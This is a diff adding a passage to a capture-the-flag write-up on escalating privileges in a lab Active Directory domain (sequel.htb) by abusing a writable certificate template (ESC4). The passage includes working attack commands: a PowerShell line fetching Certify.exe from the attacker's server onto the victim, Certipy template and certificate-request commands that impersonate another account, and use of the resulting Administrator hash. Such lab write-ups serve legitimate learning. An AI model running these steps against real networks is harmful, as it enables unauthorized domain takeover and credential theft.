@@ -134,4 +134,101 @@ impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'user' -targ
 ![](../pics/dacl.png)
 
 okay now what ???
-now after we changed the owner 
+now after we changed the owner to ryan and abused the grant rights , since the CA_SVC is certificate pushplisher so how about trying to abuse the Certificate Template Access Control 
+
+###  Certificate Template Access Control (ESC4)
+
+Active Directory Certificate Services (AD CS) allows organizations to issue digital certificates for authentication, encryption, and signing
+**ESC4** is a privilege escalation vulnerability where an attacker can modify a certificate template (due to weak permissions) to make it abusable (like ESC1, ESC2, or ESC3)
+
+#### Certificate Template
+its a blueprint that defines:
+
+- Who can request certificates (Enrollment Rights)
+
+- What the certificate can be used for Extended Key Usage "EKU"
+
+- Security settings like "Requires Manager Approval"
+
+- Stored in Active Directory and managed via Certification Authority (CA)
+
+#### ESC4
+If a user has write permissions on a certificate template they can change its settings to make it vulnerable like ESC1 where a normal user can get a Domain Admin certificate
+
+**you can read more about this attack at the resources section down below**
+
+we will use tool called **certipy-ad** to perform this attack 
+![](../pics/cres.png)
+
+we perform a Shadow Credentials attack, which allows you to take over the ca_svc account by adding a Key Credential "a certificate based authentication method" to it
+
+now let's search for misconfigured templates but first we have to upload **Certify** on the victim machine 
+
+let's create quick server on the directory that has Certify.exe to be able to download it on the victim machine by this command 
+
+```bash
+python3 -m http.server 8000 
+```
+
+then we can execute this powershell command on the victim machine 
+
+```powershell
+cd $env:USERPROFILE\Desktop; iwr "http://10.10.16.3:8000/Certify.exe" -OutFile "Certify.exe"
+```
+
+then we can run it by this command 
+```powershell
+./Certify.exe find /domain:sequel.htb
+```
+![](../pics/certresult.png)
+
+okay we got some juicy information here
+
+This certificate template **DunderMifflinAuthentication** has several dangerous misconfigurations that could allow privilege escalation
+![](../pics/cert.png)
+
+now we need to list all the available certificate templates using the forged Kerberos ticket
+
+so we will use **ca_svc.ccache**
+this file contain the Kerberos credential  that was created during the shadow attack
+
+so let's use `certipy-ad template` command to lists information about certificate templates available on the Domain Controller (CA server)
+
+```bash
+KRB5CCNAME=$KRB5_FILE certipy template -k -template "$TEMPLATE" -dc-ip "$HOST" -target "$DC"
+```
+![](../pics/xxx.png)
+
+
+we now control the **DunderMifflinAuthentication** template and we can issue certificates for any user we want  including the Domain Admin 
+
+we can do that by using the following command 
+```bash
+sudo certipy-ad req -u ca_svc -hashes '3xxxxxxxxxxxxxxxxxxxxxxxxx' -ca sequel-DC01-CA -target sequel.htb -dc-ip xx.xx.xx.xx -template DunderMifflinAuthentication -upn target@sequel.htb -dns target.sequel.htb -ns xx.xx.xx.xx -debug
+```
+
+![](../pics/admin.png)
+
+now lets use `administrator_administrator.pfx` to get the TGT 
+
+![](../pics/fin.png)
+
+finally we got the Administrator hash through the certificate
+
+let's use it now to get the root flag 
+we will login using `Evil-Winrm`
+
+![](../pics/done.png)
+
+finally we got the root flag too
+thank you for reading and if you had any questions you can reach me out on twitter @kareemwalid17
+
+![alt text](https://media.tenor.com/H9y5_3rPqkAAAAAM/peace-out-im-out.gif)
+
+## Resources Time
+[Hacking with Bloodhound: Map Your Environment](https://www.youtube.com/watch?v=0gK8t7Kk7ZI)
+[Vulnerable Certificate Template Access Control - ESC4](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4)
+[SMB hacking](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
+[Shadow credentials abusing](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+[Attacking kerberos Authentication](https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=9501961)
+[AD hacking Steps](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
